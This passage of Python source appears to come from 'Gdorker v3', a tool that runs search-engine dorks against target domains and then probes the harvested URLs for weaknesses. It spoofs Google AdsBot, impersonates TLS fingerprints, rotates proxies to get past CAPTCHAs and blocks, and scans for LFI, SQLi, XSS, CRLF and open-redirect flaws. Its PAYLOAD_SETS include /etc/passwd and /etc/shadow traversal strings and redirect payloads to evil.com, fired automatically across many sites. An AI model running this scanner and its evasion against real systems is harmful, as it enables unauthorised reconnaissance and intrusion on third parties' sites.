                print(f"{YELLOW}[*] {fb} also blocked; trying SearXNG fallback (if configured).{WHITE}")
                fb2 = _try_searx()
                return fb2 if fb2 is not None else r2
            return r2
        if fb == 'searxng' and searx_host:
            return querysearch_searxng(query, debug, page_num, searx_host=searx_host)
    return result


def _make_target_fallback(query, debug):
    return partial(run_search_fallback, query, debug)


################
# SEARCH RESULT#
################
# SEARCH RESULT#
################
def _snapshot_search_config():
    return {
        'engine': engine, 'searx_host': searx_host, 'yacy_host': yacy_host,
        'searx_engines': searx_engines, 'searx_categories': searx_categories,
        'use_proxy': use_proxy, 'use_adsbot': use_adsbot, 'use_cffi': use_cffi,
        'proxy_pool': proxy_pool, 'proxy_index': proxy_index,
        'consecutive_captcha_hits': consecutive_captcha_hits,
    }


def _restore_search_config(cfg):
    for k, v in (cfg or {}).items():
        globals()[k] = v


def _init_pool_worker(cfg=None):
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    _restore_search_config(cfg)


def Search_result(processes, target, pages, collect=None):
    try:
        with Pool(int(processes), initializer=_init_pool_worker,
                  initargs=(_snapshot_search_config(),)) as p:
            result = p.map(target, range(int(pages)))

        all_results, block_reasons = [], []
        for r in result:
            if isinstance(r, dict) and r.get('_blocked'):
                block_reasons.append(r['_blocked'])
            elif r:
                all_results.extend(r if isinstance(r, list) else [r])
        all_results = dedup_results(all_results)
        if collect is not None:
            collect.extend(all_results)
        for _r in all_results:
            if isinstance(_r, dict):
                SNAP.add_result(_r)
            else:
                SNAP.add_result({"url": _r, "title": "", "engine": engine})

        if not all_results:
            if block_reasons:
                print_blocked(block_reasons[0])
            else:
                print(f"{GREEN}[+]{WHITE} No matching results on this page.")
            return

        print(f"{BLUE}[{WHITE}+{BLUE}]{WHITE} Listing Sites...{GREEN}\n")
        for i, item in enumerate(all_results, 1):
            _print_result_item(i, item)
            time.sleep(0.02)
        print()

        n = len(all_results)
        if _should_prompt_more(n, pages, notify_more_pages):
            print(f"{YELLOW}[*] {n} results on a single page; more may exist.{WHITE}")
            try:
                ans = input("  Continue fetching next page? [y/N]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                ans = ''
            if ans in ('y', 'yes'):
                extra = _fetch_extra(target, pages, 1)
                extra = dedup_results(extra)
                if collect is not None:
                    collect.extend(extra)
                for e in extra:
                    if isinstance(e, dict):
                        SNAP.add_result(e)
                    else:
                        SNAP.add_result({"url": e, "title": "", "engine": engine})
                    _print_result_item('+', e)
    except Exception as e:
        print(f"{RED}[!] runtime error in search: {WHITE}{e}")


def _should_prompt_more(result_count, requested_pages, notify=True):
    """Pure logic for the 'More results exist?' pagination prompt."""
    return bool(notify and int(requested_pages) == 1 and result_count > 0)


def _print_result_item(i, item):
    """Pretty-print a single result (respects show_meta). Shared by list + extra-pages."""
    if isinstance(item, dict) and show_meta:
        title = item.get('title') or '(no title)'
        url = item.get('url', '')
        snippet = (item.get('content') or '').strip()
        if len(snippet) > 200:
            snippet = snippet[:200].rstrip() + '...'
        eng = item.get('engine') or ''
        print(f"{BLUE}[{i}]{WHITE} {CYAN}{title}{WHITE}")
        print(f"    {GREEN}URL{WHITE}     : {url}")
        if eng:
            print(f"    {GREEN}Engine{WHITE}  : {eng}")
        if snippet:
            print(f"    {GREEN}Snippet{WHITE} : {snippet}")
        print()
    else:
        url = item.get('url') if isinstance(item, dict) else item
        print(f"{BLUE}[{i}]{WHITE} | {GREEN}{url}{WHITE}")


def _fetch_extra(target, start_pages, extra):
    out = []
    for i in range(int(extra)):
        try:
            r = target(start_pages + 1 + i)
            if isinstance(r, dict) and r.get('_blocked'):
                break
            if r:
                out.extend(r)
        except Exception:
            break
    return out


def print_blocked(reason):
    if reason == 'captcha':
        print(f"{RED}[!]{WHITE} CAPTCHA - no results. Free manual resolver or -e duckduckgo.")
    elif reason == 'consent':
        print(f"{RED}[!]{WHITE} Consent-wall (not captcha).")
    elif reason == 'js_required':
        print(f"{RED}[!]{WHITE} JS-required interstitial. Try --adsbot / --cffi / -e duckduckgo.")
    elif reason == 'rate_limited':
        print(f"{RED}[!]{WHITE} Rate limited; slow down or switch engine.")
    elif reason == 'searxng_json_disabled':
        print(f"{RED}[!]{WHITE} SearXNG JSON disabled on this instance.")
    else:
        print(f"{RED}[!]{WHITE} Request blocked: {reason}")


##########################
# DORK CORE / QUERY CORE #
##########################
def dork_core(sites, dork_items, debug, collect=None):
    global engine
    total = len(dork_items)
    for site in sites:
        print(f"\n{GREEN}[+{WHITE}] {YELLOW}Target : {WHITE}{site}")
        print(f"{GREEN}[+{WHITE}] {YELLOW}Engine : {WHITE}{engine}")
        print(f"{GREEN}[+{WHITE}] {YELLOW}Total Dorks : {WHITE}{total}\n")
        for idx, item in enumerate(dork_items, 1):
            query = make_query(site, item)
            print(f"{MAGENTA}[{idx}/{total}] {YELLOW}Testing dork: {WHITE}{query}")
            print(f"{GREEN}[+{WHITE}] {YELLOW}Query: {WHITE}{query}\n")
            target = _make_target_fallback(query, debug)
            Search_result(processes, target, pages, collect=collect)
            time.sleep(1.2)


def query_core(query, pages, processes, debug, collect=None):
    global engine
    print(f"\n{CYAN}{'='*60}{WHITE}")
    print(f"{GREEN}[{RESET}]{WHITE} Query    : {WHITE}{query}")
    print(f"{GREEN}[{RESET}]{WHITE} Engine   : {WHITE}{engine.upper()}")
    print(f"{GREEN}[{RESET}]{WHITE} Pages    : {WHITE}{pages}")
    print(f"{GREEN}[{RESET}]{WHITE} Processes: {WHITE}{processes}")
    print(f"{CYAN}{'='*60}{WHITE}\n")
    target = _make_target_fallback(query, debug)
    Search_result(processes, target, pages, collect=collect)


######################################
# LOG / OUTPUT PIPELINE (-O flag)    #
######################################
class Tee:
    def __init__(self, stream, *files):
        self.stream = stream
        self.files = files
    def write(self, data):
        self.stream.write(data)
        for f in self.files:
            try:
                f.write(data)
            except Exception:
                pass
        self.flush()
    def flush(self):
        try:
            self.stream.flush()
        except Exception:
            pass
        for f in self.files:
            try:
                f.flush()
            except Exception:
                pass


def setup_output_log(path):
    global log_handle
    f = open(os.path.expanduser(path), 'a', encoding='utf-8')
    log_handle = f
    sys.stdout = Tee(sys.stdout, f)
    sys.stderr = Tee(sys.stderr, f)
    print(f"{GREEN}[output] all scan logs -> {WHITE}{path}")


def write_results_file(path, rows):
    rows = dedup_results(rows)
    with open(path, 'w', encoding='utf-8') as f:
        for r in rows:
            if isinstance(r, dict):
                f.write(f"{r.get('url','')}\n")
            else:
                f.write(f"{r}\n")
    print(f"{GREEN}[+] {len(rows)} URLs -> {WHITE}{path}")


def write_structured(path, rows, fmt='json'):
    rows = dedup_results(rows)
    with open(path, 'w', encoding='utf-8') as f:
        if fmt == 'csv':
            f.write("title,url,engine,snippet\n")
            for r in rows:
                if isinstance(r, dict):
                    f.write(f"{(r.get('title','') or '').replace(',',' ')},{(r.get('url','') or '')},"
                            f"{(r.get('engine','') or '').replace(',',' ')},"
                            f"{(r.get('content','') or '').replace(chr(10),' ').replace(',',' ')[:150]}\n")
                else:
                    f.write(f",{r},,\n")
        else:
            payload = [r if isinstance(r, dict) else {'url': r} for r in rows]
            json.dump(payload, f, indent=2)
    print(f"{GREEN}[+] structured -> {WHITE}{path}")


########################
# WEB REPORT VIEW      #
########################
class WebSnapshot:
    def __init__(self):
        self.lock = threading.Lock()
        self.data = {"state": "idle", "engine": engine, "sites": [],
                     "dorks_total": 0, "dorks_done": 0, "queries": 0, "results_count": 0,
                     "blocked": 0, "captchas": 0, "results": [], "log": []}
    def update(self, **kw):
        with self.lock:
            self.data.update(kw)
    def add_result(self, item):
        with self.lock:
            self.data["results"].append(item)
            self.data["results_count"] = len(self.data["results"])
    def add_log(self, msg):
        with self.lock:
            self.data["log"].append(msg)
            if len(self.data["log"]) > 200:
                self.data["log"] = self.data["log"][-200:]
    def get(self):
        import copy
        with self.lock:
            return copy.deepcopy(self.data)

SNAP = WebSnapshot()
RESULT_ROWS = []

INDEX_HTML = """<!doctype html><html lang=en><head><meta charset=utf-8>
<title>Gdorker recon view</title><style>
body{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:24px}
h1{color:#3fb950}.stat{background:#161b22;display:inline-block;padding:8px 14px;margin:0 10px 10px 0;border:1px solid #30363d;border-radius:8px}
.stat b{color:#58a6ff}table{width:100%;border-collapse:collapse;margin-top:16px}
th,td{text-align:left;padding:6px 10px;border-bottom:1px solid #21262d}
a{color:#58a6ff;word-break:break-all}</style></head><body>
<h1>Gdorker <span style=color:#484f58>recon</span></h1>
<div id=stats></div><table><thead><tr><th>#</th><th>Title</th><th>URL</th><th>Engine</th></tr></thead>
<tbody id=rows></tbody></table>
<script>
const after=async()=>{const d=await(await fetch('/data')).json();
document.getElementById('stats').innerHTML=
`<div class=stat>state <b>${d.state}</b></div>
<div class=stat>dorks <b>${d.dorks_done}/${d.dorks_total}</b></div>
<div class=stat>queries <b>${d.queries}</b></div>
<div class=stat>results <b>${d.results_count}</b></div>
<div class=stat>blocked <b>${d.blocked}</b></div>
<div class=stat>captchas <b>${d.captchas}</b></div>`;
document.getElementById('rows').innerHTML=(d.results||[]).map((r,i)=>
`<tr><td>${i+1}</td><td>${r.title||''}</td><td><a href="${r.url||r}" target=_blank>${r.url||r}</a></td><td>${r.engine||''}</td></tr>`).join('');};
setInterval(after,2000);after();
</script></body></html>"""

class ReportHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/data'):
            body = json.dumps(SNAP.get()).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            html = INDEX_HTML
            body = html.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        return
    def log_message(self, fmt, *args): pass


class ReportServer(threading.Thread):
    def __init__(self, host='0.0.0.0', port=0):
        super().__init__(daemon=True)
        self.host, self.port = host, port
        self.httpd = None
    def run(self):
        self.httpd = HTTPServer((self.host, self.port), ReportHandler)
        self.port = self.httpd.server_address[1]
        print(f"{GREEN}[+] Web report view: http://127.0.0.1:{self.port}/ (poll every 2s){WHITE}")
        try:
            self.httpd.serve_forever()
        except Exception:
            pass


def start_webview(host='127.0.0.1'):
    global webview
    # bind to localhost for safety (change with --web-host if you want LAN)
    srv = ReportServer(host=host, port=0)
    srv.start()
    webview = srv
    for _ in range(50):          # wait for the thread to bind the socket
        if srv.port:
            break
        time.sleep(0.05)
    return srv.port


#################################
# H4 EXTERNAL RECON TOOL KIT    #
#################################
def open_external_tools(sites, open_browser=False, write_path=None):
    f = open(write_path, 'a') if write_path else None
    for site in sites:
        print(f"\n{CYAN}[+] External recon for {WHITE}{site}{CYAN}:{WHITE}")
        for tool in H4_EXTERNAL:
            url = tool['url'].format(domain=quote(site, safe=''))
            print(f"  {GREEN}[+]{WHITE} {tool['name']:24} {url}")
            if f:
                f.write(f"{tool['name']}\t{url}\n")
            if open_browser:
                open_url_in_browser(url)
    if f:
        f.close()


###################################
# LOX-ISH VULN SCANNER            #
###################################
PAYLOAD_SETS = {
    "lfi": ["/etc/passwd", "../../../etc/passwd", "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd", "..%2f..%2f..%2fetc%2fshadow"],
    "sqli": ["'", "''", "1' OR '1'='1", "1 AND 1=1", "' OR 1=1-- "],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "javascript:alert(1)"],
    "crlf": ["%0d%0aX-Injected: true", "hello%0d%0aSet-Cookie: injected=1",
             "%0d%0aLocation: //evil.com", "%00"],
    "openredirect": ["//example.com", "https://example.com/%2f..", "////evil.com"],
}

MATCH_PATTERNS = {
    "lfi": [b"root:", b"daemon:", b"/etc/passwd", b"nobody:", b"/bin/sh"],
    "sqli": [b"sql syntax", b"mysql", b"you have an error", b"unclosed quotation", b"Query failed"],
    "xss": [b"<script>alert(1)", b"onerror=alert", b"<svg/onload"],
    "crlf": [b"X-Injected", b"Set-Cookie", b"Location: header"],
    "openredirect": [b"//example.com"],
}


def _probe(url, payload, timeout=6):
    try:
        return requests.get(url + payload, timeout=timeout, allow_redirects=False,
                            headers={'User-Agent': random.choice(USER_AGENTS)})
    except Exception:
        return None


def load_payload_file(path):
    """Load {type: [payload, ...]} from a JSON file; return {} on failure."""
    custom = {}
    if not path or not os.path.isfile(path):
        return custom
    try:
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        for k, v in data.items():
            if isinstance(v, list):
                custom[str(k)] = [str(x) for x in v]
    except Exception as e:
        print(f"{RED}[!] payload file {path} read failed: {e}{WHITE}")
    return custom


def find_vulns(url, types, match_override=None, timeout=6, payloads=None):
    """Attach payloads as query param; classify matches by MATCH_PATTERNS."""
    findings = []
    payloads = dict(PAYLOAD_SETS) if payloads is None else payloads
    for t in types:
        for payload in payloads.get(t, []):
            r = _probe(url, payload if (url or '').rstrip().endswith('?') else ('?' + payload), timeout)
            if r is None:
                continue
            body = r.text.encode('utf-8', 'ignore')
            pats = match_override or MATCH_PATTERNS.get(t, [])
            if any(p in body for p in pats):
                findings.append({"url": f"{url}?{payload}", "type": t,
                                 "payload": payload, "status": r.status_code, "match": True})
                break
    return findings


def scan_urls(urls, types, threads=4, match_override=None, out=None, payload_file=None):
    findings = []
    payloads = dict(PAYLOAD_SETS)
    payloads.update(load_payload_file(payload_file))
    def work(u):
        return u, find_vulns(u, types, match_override, payloads=payloads)
    with ThreadPoolExecutor(max_workers=int(threads)) as ex:
        for u, f in ex.map(work, urls):
            for x in f:
                print(f"{RED}[!]{WHITE} [x] {x['type']:14} {x['url']} ({x['status']})")
                findings.append(x)
    if out:
        with open(out, 'w', encoding='utf-8') as fh:
            json.dump(findings, fh, indent=2)
        print(f"{GREEN}[+] findings -> {out}{WHITE}")
    return findings


def write_html_report(findings, path):
    rows = "".join(
        f"<tr><td>{f['type']}</td><td><a href='{f['url']}'>{f['url']}</a></td>"
        f"<td>{f['payload']}</td><td>{f['status']}</td></tr>" for f in findings)
    html = f"<html><head><title>Gdorker findings</title></head><body>"
    html += f"<h1>Scan findings ({len(findings)})</h1><table border=1>"
    html += f"<tr><th>Type</th><th>URL</th><th>Payload</th><th>Status</th></tr>{rows}</table></body></html>"
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html)
    print(f"{GREEN}[+] HTML report -> {path}{WHITE}")


###################################
# CLI / BANNER / MAIN             #
###################################
def banner():
    print(f'''{GREEN}
8""""8      8""""8
8    "      8     8 eeeee eeeee  e   e  eeee eeeee
8e          8e    8 8  88 8   8  8   8  8    8   8
88  ee eeee 88   8 8   8 8eee8e 8eee8e 8eee 8eee8e
88   8      88   8 8   8 88   8 88   8 88   88  8
88eee8      88eee8 8eee8 88   8 88   8 88ee 88  8 {YELLOW}v{VERSION}{WHITE}
                                                 {YELLOW}by @e343io{WHITE}
{WHITE}------------------------------------------------------------
#{BLUE} --adsbot      : spoof Google AdsBot crawler UA (JS-wall workaround)  {WHITE}#
#{BLUE} --cffi        : TLS/JA3 fingerprint impersonation via curl_cffi      {WHITE}#
{BLUE} -o/-O/--out   : save the whole scan log to file {WHITE}
{BLUE} --web         : live HTML report on localhost (auto port) {WHITE}
{BLUE} --auto-recon  : full autonomous run (every dork x every site) {WHITE}
{BLUE} --dorks       : builtin dork set: default | h4 | all {WHITE}
{BLUE} --scan/--check: loxs-style LFI/SQLi/XSS/CRLF/OpenRedirect checks {WHITE}
{WHITE}---------------------------------------------------------------------
{WHITE}''')


def build_argparser():
    from argparse import ArgumentParser, SUPPRESS
    p = ArgumentParser(description="Gdorker v3 - autonomous Google-dorking + recon",
                       add_help=True)
    p.add_argument("-s", "--search", dest="search", default=None,
                   help="Site/domain to search (e.g. example.com)")
    p.add_argument("-d", "--dork", dest="dork", nargs='?', const=True, default=False,
                   help="Use default dork set; -d <file> for custom dork list file; -d- to search your query as-is (quote the query)")
    p.add_argument("-D", "--dork-set", "--dorks", dest="dork_set", default="default",
                   help="Built-in dork set: default | h4 | all")
    p.add_argument("-e", "--engine", dest="engine_arg", default=None,
                   help="google / bing / duckduckgo / searxng / yacy")
    p.add_argument("-p", "--pages", dest="pages", type=int, default=1, help="Pages (default 1)")
    p.add_argument("-P", "--process", dest="processes", type=int, default=2, help="Processes (default 2)")
    p.add_argument("-sl", "--site-list", dest="sitelist", default=None, help="Site list file")
    p.add_argument("--auto-recon", action="store_true",
                   help="Autonomous: run the selected dork set against every site, headless, without prompts")
    p.add_argument("-o", "--output", "--out", dest="log_output", default=None,
                   help="Save the entire scan log into this file (GREEN flag free)")
    p.add_argument("-O", dest="log_output", default=None, help=SUPPRESS)  # alias
    p.add_argument("--web", action="store_true", help="Serve live HTML report on localhost")
    p.add_argument("--web-host", dest="web_host", default="127.0.0.1", help="Bind address for --web")
    p.add_argument("--json-out", dest="json_out", default=None, help="Write structured JSON results")
    p.add_argument("--csv-out", dest="csv_out", default=None, help="Write CSV results")
    p.add_argument("--txt-out", dest="txt_out", default=None, help="Write plain URL list")
    p.add_argument("--proxy", dest="proxy_mode", default='off',
                   help="'on' (auto GitHub list) or a proxy file path")
    p.add_argument("--open-external", action="store_true",
                   help="Open H4 external recon links for each target in browser")
    p.add_argument("--external-file", dest="external_file", default=None,
                   help="Write H4 external recon links into this file")
    p.add_argument("--scan", "--check", dest="scan", nargs='?', const='auto', default=None,
                   help="LFI/SQLi/XSS/CRLF/OpenRedirect checks on gathered (or file) URLs. Optional arg: <types> or <urlfile>")
    p.add_argument("--payloads", dest="payload_file", default=None,
                   help="Custom JSON payload file: {type: [payload, ...]} for --scan")
    p.add_argument("--types", dest="vuln_types", default="lfi,sqli,xss,crlf,openredirect",
                   help="Comma-list of vuln types for --scan")
    p.add_argument("--threads", dest="threads", type=int, default=4)
    p.add_argument("--match", dest="match_override", default=None,
                   help="Regex/byte-pattern to treat as success")
    p.add_argument("--html-report", dest="report_html", default=None,
                   help="Write an HTML findings report")
    p.add_argument("--resume-file", dest="resume_file", default=None,
                   help="Resume auto-recon from a saved JSONL state")
    p.add_argument("--debug", action="store_true", help="Debug printouts")
    p.add_argument("--adsbot", action="store_true", help="Prefer AdsBot UA ladder")
    p.add_argument("--cffi", action="store_true", help="Enable curl_cffi impersonation")
    p.add_argument("--searx-host", dest="searx_host", default=None)
    p.add_argument("--searx-engines", dest="searx_engines", default=None)
    p.add_argument("--searx-categories", dest="searx_categories", default='general')
    p.add_argument("--yacy-host", dest="yacy_host", default=None)
    return p


def main():
    global engine, pages, processes, use_adsbot, use_cffi, use_proxy, proxy_pool
    global searx_host, yacy_host, searx_engines, searx_categories, ask_pages
    global show_meta

    banner()

    try:
        if readline is not None:
            readline.set_completer(completer)
            readline.parse_and_bind("tab: complete")
    except Exception:
        pass

    args = build_argparser().parse_args()

    # ---- log pipe
    if args.log_output:
        setup_output_log(args.log_output)

    # ---- engine
    if not args.engine_arg:
        try:
            u = input(f"{CYAN}Choose engine {YELLOW}({'/'.join(VALID_ENGINES)}){WHITE}\n> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            u = ''
        engine = u if u in VALID_ENGINES else 'google'
        if u and u not in VALID_ENGINES:
            print(f"{YELLOW}[!] Default engine: google{WHITE}")
    else:
        engine = args.engine_arg.lower()
        if engine not in VALID_ENGINES:
            print(f"{RED}[!] Invalid engine.{WHITE}")
            sys.exit(1)

    pages = args.pages
    processes = args.processes
    use_adsbot = args.adsbot
    use_cffi = args.cffi
    if use_cffi and not HAVE_CURL_CFFI:
        print(f"{RED}[!] --cffi requires curl_cffi.{WHITE}")
        sys.exit(1)
    searx_host, yacy_host = args.searx_host, args.yacy_host
    searx_engines, searx_categories = args.searx_engines, args.searx_categories
    if engine == 'searxng' and not searx_host:
        try:
            searx_host = input(f"{CYAN}[?] SearXNG host URL missing (e.g. http://localhost:8080):{WHITE}\n> ").strip()
        except (EOFError, KeyboardInterrupt):
            sys.exit(1)
        if not searx_host:
            print(f"{RED}[!] -e searxng requires --searx-host{WHITE}")
            sys.exit(1)
    if engine == 'yacy' and not yacy_host:
        try:
            yacy_host = input(f"{CYAN}[?] YaCy host URL missing (e.g. http://localhost:8090):{WHITE}\n> ").strip()
        except (EOFError, KeyboardInterrupt):
            sys.exit(1)
        if not yacy_host:
            print(f"{RED}[!] -e yacy requires --yacy-host{WHITE}")
            sys.exit(1)

    # ---- per-run preferences (metadata + logging) ----
    if not args.auto_recon and not args.log_output:
        try:
            m = input(f"{CYAN}[?] Show full metadata / extra info for results? {YELLOW}(y/N){WHITE}\n> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            m = ''
        show_meta = m.startswith('y')
        try:
            l = input(f"{CYAN}[?] Save this run's log to a file for further recon? {YELLOW}(y/N){WHITE}\n> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            l = ''
        if l.startswith('y'):
            try:
                log_name = input(f"{CYAN}[?] Log file name: {YELLOW}(default: recon.log){WHITE}\n> ").strip()
            except (EOFError, KeyboardInterrupt):
                log_name = ''
            setup_output_log(log_name or 'recon.log')

    # ---- proxy ----
    if args.proxy_mode:
        if args.proxy_mode == 'on':
            use_proxy = True
            proxy_pool[:] = UPND_PROXIES()
        elif os.path.isfile(args.proxy_mode):
            use_proxy = True
            proxy_pool[:] = load_proxy_file_(args.proxy_mode)
        if use_proxy:
            if proxy_pool:
                print(f"{GREEN}[+] Proxy pool: {len(proxy_pool)} proxies, rotation ON.{WHITE}")
            else:
                print(f"{YELLOW}[!] No proxies fetched for rotation.{WHITE}")
                use_proxy = False

    # ---- web view ----
    if args.web:
        start_webview(args.web_host)

    # ---- sites ----
    sites = []
    if args.sitelist and os.path.exists(args.sitelist):
        sites = SortFileCore(args.sitelist)
    elif args.search:
        sites = [args.search]
    else:
        if args.auto_recon:
            print(f"{RED}[!] --auto-recon needs -s <domain> or -sl <site list file>.{WHITE}")
            sys.exit(1)
        try:
            u = input(f"{CYAN}Enter search query/URL:{WHITE}\n> ").strip()
        except (EOFError, KeyboardInterrupt):
            u = ''
        sites = [u] if u else []
    if not sites:
        print(f"{RED}[!] No target.{WHITE}")
        sys.exit(1)

    # ---- dork items ----
    if args.auto_recon:
        items, n = resolve_dork_items(args.dork_set, args.dork)
    elif args.dork is False and not isinstance(args.dork, str) and \
            args.dork_set in (None, 'default', 'builtin'):
        try:
            choice = input(f"{CYAN}[?] Use [D]efault dork list or [S]earch the query directly?{WHITE}\n> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            choice = ''
        if choice.startswith('s'):
            items, n = None, 0
        else:
            items, n = resolve_dork_items(args.dork_set, args.dork)
    else:
        items, n = resolve_dork_items(args.dork_set, args.dork)

    # ---- auto-recon route ----
    if args.auto_recon:
        run_auto_recon(sites, items, args.debug, resume_file=args.resume_file,
                       jsonl_out=args.json_out, csv_out=args.csv_out)
    else:
        if items is None:
            # simple query
            query_core(sites[0], pages, processes, args.debug, collect=RESULT_ROWS)
        else:
            dork_core(sites, items, args.debug, collect=RESULT_ROWS)

    # ---- external recon (H4 group B) ----
    if args.open_external or args.external_file:
        open_external_tools(sites, open_browser=args.open_external,
                            write_path=args.external_file)

    # ---- results output files (auto-recon already writes incrementally) ----
    if RESULT_ROWS and not args.auto_recon:
        if args.txt_out:
            write_results_file(args.txt_out, RESULT_ROWS)
        if args.json_out:
            write_structured(args.json_out, RESULT_ROWS, 'json')
        if args.csv_out:
            write_structured(args.csv_out, RESULT_ROWS, 'csv')

    # ---- vuln scanning (loxs-style) ----
    urls = None
    if args.scan:
        types = [t.strip() for t in args.vuln_types.split(',') if t.strip()]
        if args.scan != 'auto':
            if os.path.isfile(args.scan):
                urls = SortFileCore(args.scan)
            else:
                urls = [args.scan]
        if urls is None or not urls:
            urls = [u.get('url') if isinstance(u, dict) else u for u in RESULT_ROWS]
            urls = list(dict.fromkeys([u for u in urls if u]))
        if urls:
            print(f"{CYAN}[*] Scanning {len(urls)} URLs for [{', '.join(types)}]{WHITE}")
            findings = scan_urls(urls, types, threads=args.threads,
                                 match_override=args.match_override,
                                 payload_file=args.payload_file)
            if findings:
                ts = datetime.now().strftime('%Y%m%d-%H%M%S')
                vuln_path = f'vulns-{ts}.txt'
                write_results_file(vuln_path, [f['url'] for f in findings])
                print(f"{YELLOW}[*] vulnerable URLs also listed in {vuln_path}{WHITE}")
            if args.report_html:
                write_html_report(findings, args.report_html)
        else:
            print(f"{YELLOW}[!] --scan found no URLs to test.{WHITE}")

    if webview:
        webview.httpd.shutdown()

    if log_handle:
        log_handle.flush()
        log_handle.close()


def max_pages_follow():
    return max_follow_pages


def run_auto_recon(sites, items, debug=False, resume_file=None, jsonl_out=None, csv_out=None):
    """Headless: loop dork items x sites, save every URL, never prompt.
    Crash-safe: incremental JSONL/CSV + --resume re-run skips query states already seen."""
    global RESULT_ROWS
    done_states = set()
    if resume_file and os.path.isfile(resume_file):
        try:
            with open(resume_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        state = json.loads(line)
                    except Exception:
                        state = {"q": line}
                    if state.get('done'):
                        done_states.add(state.get('q', ''))
            print(f"{GREEN}[+] resume: skipping {len(done_states)} already-done queries from {resume_file}{WHITE}")
        except Exception as e:
            print(f"{RED}[!] resume state read failed: {e}{WHITE}")
    total = (len(items) or 1) * len(sites)
    done = 0
    SNAP.update(state="running", sites=sites, dorks_total=total)
    SNAP.update(engine=engine)
    jsonl_fh = csv_fh = state_fh = None
    if jsonl_out:
        jsonl_fh = open(jsonl_out, 'a', encoding='utf-8')
    if csv_out:
        csv_fh = open(csv_out, 'a', encoding='utf-8')
        if not os.path.isfile(csv_out) or os.path.getsize(csv_out) == 0:
            csv_fh.write("title,url,engine,snippet\n")
    if resume_file:
        state_fh = open(resume_file, 'a', encoding='utf-8')
    try:
        for site in sites:
            for item in (items or [{}]):
                query = make_query(site, item)
                done += 1
                SNAP.update(dorks_done=done)
                if query in done_states:
                    continue
                print(f"{MAGENTA}[{done}/{total}] {YELLOW}dork {site} :: {query}{WHITE}")
                target = _make_target_fallback(query, debug)
                # sequential pagination with auto-stop at <10
                page_results = []
                for p in range(max_pages_follow()):
                    r = target(p)
                    if isinstance(r, dict) and r.get('_blocked'):
                        SNAP.update(blocked=SNAP.get()["blocked"] + 1)
                        if r['_blocked'] == 'captcha':
                            SNAP.update(captchas=SNAP.get()["captchas"] + 1)
                        break
                    new = dedup_results([x for x in r] if r else [])
                    page_results.extend(new)
                    for x in new:
                        if isinstance(x, dict):
                            SNAP.add_result(x)
                        else:
                            SNAP.add_result({"url": x, "title": "", "engine": engine})
                    if len(new) < 10 and p < pages:
                        break
                RESULT_ROWS.extend(dedup_results(page_results))
                RESULT_ROWS = dedup_results(RESULT_ROWS)
                SNAP.add_log(query + f" -> {len(page_results)} results")
                if jsonl_fh:
                    for x in dedup_results(page_results):
                        jsonl_fh.write(json.dumps(x if isinstance(x, dict) else {"url": x}) + "\n")
                    jsonl_fh.flush()
                if csv_fh:
                    for x in dedup_results(page_results):
                        if isinstance(x, dict):
                            csv_fh.write(f"{(x.get('title','') or '').replace(',',' ')},{(x.get('url','') or '')},"
                                         f"{(x.get('engine','') or '').replace(',',' ')},"
                                         f"{(x.get('content','') or '').replace(chr(10),' ').replace(',',' ')[:150]}\n")
                        else:
                            csv_fh.write(f",{x},,\n")
                    csv_fh.flush()
                if state_fh:
                    state_fh.write(json.dumps({"q": query, "done": True, "results": len(page_results)}) + "\n")
                    state_fh.flush()
                time.sleep(0.4)
    finally:
        if jsonl_fh:
            jsonl_fh.close()
        if csv_fh:
            csv_fh.close()
        if state_fh:
            state_fh.close()
    RESULT_ROWS = dedup_results(RESULT_ROWS)
    SNAP.update(state="done", results_count=len(RESULT_ROWS))
    print(f"{GREEN}[+] auto-recon done: {len(RESULT_ROWS)} unique URLs.{WHITE}")


def user_reports():
    pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted.{WHITE}")
        sys.exit(0)
    except EOFError:
        print(f"\n{YELLOW}[!] EOF.{WHITE}")
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {e}{WHITE}")
    exit(1)
